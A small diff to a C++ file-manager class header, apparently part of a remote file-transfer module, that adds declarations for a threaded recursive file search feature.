@@ -53,6 +53,11 @@ private:
     void WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize);
     void UploadNext();
     bool OpenFile(LPCTSTR lpFile, INT nShowCmd);
+    void SearchFiles(LPCTSTR lpszSearchPath, LPCTSTR lpszSearchName);
+    void SearchFilesRecursive(LPCTSTR lpszDirectory, LPCTSTR lpszPattern, LPBYTE &lpList, DWORD &dwOffset, DWORD &nBufferSize, int nDepth, DWORD &nResultCount, DWORD &dwLastSendTime);
+    static DWORD WINAPI SearchThreadProc(LPVOID lpParam);
+    HANDLE m_hSearchThread;
+    volatile bool m_bSearching;
 };
 
 #endif // !defined(AFX_FILEMANAGER_H__359D0039_E61F_46D6_86D6_A405E998FB47__INCLUDED_)
